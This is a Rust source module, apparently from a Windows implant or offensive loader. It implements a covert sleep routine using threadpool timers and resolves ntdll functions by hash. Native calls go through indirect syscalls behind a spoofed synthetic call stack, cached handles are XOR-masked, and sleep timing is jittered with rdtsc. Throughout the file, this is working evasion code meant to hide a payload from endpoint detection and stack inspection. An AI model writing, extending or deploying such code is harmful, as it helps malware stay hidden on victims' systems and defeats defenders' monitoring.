#![allow(non_snake_case)]

use winapi::ctypes::c_void;
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS};

use crate::hash::{fnv1a_hash, get_export_by_hash, get_module_by_hash, H_NTDLL};
use crate::nt::nt_success;

const H_NT_CREATE_EVENT: u64 = fnv1a_hash(b"NtCreateEvent");
const H_NT_WAIT_FOR_SINGLE_OBJECT: u64 = fnv1a_hash(b"NtWaitForSingleObject");
const H_NT_CLOSE: u64 = fnv1a_hash(b"NtClose");
const H_NT_SET_EVENT: u64 = fnv1a_hash(b"NtSetEvent");
const H_NT_RESET_EVENT: u64 = fnv1a_hash(b"NtResetEvent");

const H_TP_ALLOC_TIMER: u64 = fnv1a_hash(b"TpAllocTimer");
const H_TP_SET_TIMER: u64 = fnv1a_hash(b"TpSetTimer");
const H_TP_RELEASE_TIMER: u64 = fnv1a_hash(b"TpReleaseTimer");

type TpTimerCallbackFn = unsafe extern "system" fn(
    instance: *mut c_void,
    context: *mut c_void,
    timer: *mut c_void,
);

type TpAllocTimerFn = unsafe extern "system" fn(
    timer_return: *mut *mut c_void,
    callback: TpTimerCallbackFn,
    context: *mut c_void,
    environment: *mut c_void,
) -> NTSTATUS;

type TpSetTimerFn = unsafe extern "system" fn(
    timer: *mut c_void,
    due_time: *const LARGE_INTEGER,
    period: u32,
    window_length: u32,
);

type TpReleaseTimerFn = unsafe extern "system" fn(
    timer: *mut c_void,
);

#[inline]
fn resolve_ssn(api_hash: u64) -> Option<(u16, *const u8)> {
    unsafe { crate::ssn_resolver::resolve_ssn_by_hash(api_hash) }
}

unsafe fn spoofed_syscall(
    api_hash: u64,
    arg1: u64, arg2: u64, arg3: u64, arg4: u64,
    arg5: u64, arg6: u64, arg7: u64,
) -> NTSTATUS {
    let (ssn, stub) = match resolve_ssn(api_hash) {
        Some(s) => s,
        None => return -1,
    };
    let gadget = crate::syscalls::select_gadget_for_stub(stub);
    if gadget == 0 { return -1; }
    let chain = crate::stack_spoof::build_zero_depth_chain();
    let chain_ptr = &chain as *const crate::stack_spoof::SyntheticChain as u64;
    crate::syscalls::indirect_syscall_spoofed(
        ssn, gadget, chain_ptr,
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, 0, 0, 0, 0,
    )
}

unsafe fn nt_create_event(event_handle: *mut HANDLE) -> NTSTATUS {
    let obj_attr = crate::nt::OBJECT_ATTRIBUTES::null();

    spoofed_syscall(
        H_NT_CREATE_EVENT,
        event_handle as u64,
        0x1F0003,
        &obj_attr as *const _ as u64,
        1,
        0,
        0, 0,
    )
}

unsafe fn nt_set_event(handle: HANDLE) -> NTSTATUS {
    spoofed_syscall(H_NT_SET_EVENT, handle as u64, 0, 0, 0, 0, 0, 0)
}

unsafe fn nt_reset_event(handle: HANDLE) -> NTSTATUS {
    spoofed_syscall(H_NT_RESET_EVENT, handle as u64, 0, 0, 0, 0, 0, 0)
}

unsafe fn nt_wait_for_single_object(
    handle: HANDLE,
    alertable: u8,
    timeout: *const LARGE_INTEGER,
) -> NTSTATUS {
    spoofed_syscall(
        H_NT_WAIT_FOR_SINGLE_OBJECT,
        handle as u64,
        alertable as u64,
        timeout as u64,
        0, 0, 0, 0,
    )
}

unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
    spoofed_syscall(H_NT_CLOSE, handle as u64, 0, 0, 0, 0, 0, 0)
}

unsafe extern "system" fn tp_timer_callback(
    _instance: *mut c_void,
    context: *mut c_void,
    _timer: *mut c_void,
) {
    let event = context as HANDLE;
    if !event.is_null() {
        nt_set_event(event);
    }
}

use core::sync::atomic::{AtomicUsize, Ordering};

static CACHED_TP_TIMER: AtomicUsize = AtomicUsize::new(0);

static CACHED_EVENT: AtomicUsize = AtomicUsize::new(0);

#[inline(always)]
unsafe fn load_cached(slot: &AtomicUsize) -> HANDLE {
    let masked = slot.load(Ordering::Acquire);
    if masked == 0 {
        core::ptr::null_mut()
    } else {
        (masked ^ (crate::stack_spoof::pool_key() as usize)) as HANDLE
    }
}

#[inline(always)]
unsafe fn store_cached(slot: &AtomicUsize, handle: HANDLE) {
    if handle.is_null() {
        slot.store(0, Ordering::Release);
    } else {
        let masked = (handle as usize) ^ (crate::stack_spoof::pool_key() as usize);
        slot.store(masked, Ordering::Release);
    }
}

unsafe fn resolve_tp_api<T>(hash: u64) -> Option<T> {
    let ntdll = get_module_by_hash(H_NTDLL)?;
    let func = get_export_by_hash(ntdll, hash)?;
    if func.is_null() { return None; }
    Some(core::mem::transmute_copy::<winapi::shared::minwindef::FARPROC, T>(&func))
}

pub(crate) unsafe fn timer_sleep_ms(millis: u64) -> bool {
    if millis == 0 {
        return true;
    }

    crate::debug_log!("[TIMER] Sleep request: {}ms (TP timer)", millis);

    let mut event: HANDLE = load_cached(&CACHED_EVENT);
    if event.is_null() {
        let mut new_event: HANDLE = core::ptr::null_mut();
        let status = nt_create_event(&mut new_event);
        if !nt_success(status) || new_event.is_null() {
            crate::debug_log!("[TIMER] NtCreateEvent failed: 0x{:X}, fallback", status);
            return fallback_delay_execution(millis);
        }
        store_cached(&CACHED_EVENT, new_event);
        event = new_event;
        crate::debug_log!("[TIMER] Event handle cached");
    }

    let mut tp_timer: *mut c_void = load_cached(&CACHED_TP_TIMER) as *mut c_void;
    if tp_timer.is_null() {
        let tp_alloc: TpAllocTimerFn = match resolve_tp_api(H_TP_ALLOC_TIMER) {
            Some(f) => f,
            None => {
                crate::debug_log!("[TIMER] TpAllocTimer not found, fallback");
                return fallback_delay_execution(millis);
            }
        };

        let mut new_timer: *mut c_void = core::ptr::null_mut();
        let status = tp_alloc(
            &mut new_timer,
            tp_timer_callback,
            event as *mut c_void,
            core::ptr::null_mut(),
        );

        if status < 0 || new_timer.is_null() {
            crate::debug_log!("[TIMER] TpAllocTimer failed: 0x{:X}, fallback", status);
            return fallback_delay_execution(millis);
        }

        store_cached(&CACHED_TP_TIMER, new_timer as HANDLE);
        tp_timer = new_timer;
        crate::debug_log!("[TIMER] TP timer cached");
    }

    nt_reset_event(event);

    let tp_set: TpSetTimerFn = match resolve_tp_api(H_TP_SET_TIMER) {
        Some(f) => f,
        None => {
            crate::debug_log!("[TIMER] TpSetTimer not found, fallback");
            return fallback_delay_execution(millis);
        }
    };

    let mut due_time: LARGE_INTEGER = core::mem::zeroed();
    *due_time.QuadPart_mut() = -((millis as i64) * 10_000);

    tp_set(
        tp_timer,
        &due_time,
        0,
        0,
    );

    let mut wait_timeout: LARGE_INTEGER = core::mem::zeroed();
    *wait_timeout.QuadPart_mut() = -((millis as i64 * 2) * 10_000);

    let status = nt_wait_for_single_object(event, 0, &wait_timeout);

    status >= 0
}

#[inline]
unsafe fn fallback_delay_execution(millis: u64) -> bool {
    let mut timeout: LARGE_INTEGER = core::mem::zeroed();
    *timeout.QuadPart_mut() = -((millis as i64) * 10_000);

    let status = crate::syscalls::nt_delay_execution(0, &timeout);
    status >= 0
}

pub(crate) unsafe fn timer_sleep_jitter(min_ms: u64, max_ms: u64) -> bool {
    if min_ms >= max_ms {
        return timer_sleep_ms(min_ms);
    }

    let tsc: u64;
    core::arch::asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") tsc, out("rdx") _);

    let range = max_ms - min_ms;
    let jitter = tsc % (range + 1);
    let sleep_time = min_ms + jitter;

    timer_sleep_ms(sleep_time)
}

pub(crate) unsafe fn cleanup_timer_resources() {

    let event = load_cached(&CACHED_EVENT);
    if !event.is_null() {
        nt_close(event);
        store_cached(&CACHED_EVENT, core::ptr::null_mut());
    }

    let tp_timer = load_cached(&CACHED_TP_TIMER) as *mut c_void;
    if !tp_timer.is_null() {

        if let Some(tp_release) = resolve_tp_api::<TpReleaseTimerFn>(H_TP_RELEASE_TIMER) {
            tp_release(tp_timer);
        }
        store_cached(&CACHED_TP_TIMER, core::ptr::null_mut());
    }

    crate::debug_log!("[TIMER] Resources cleaned up");
}

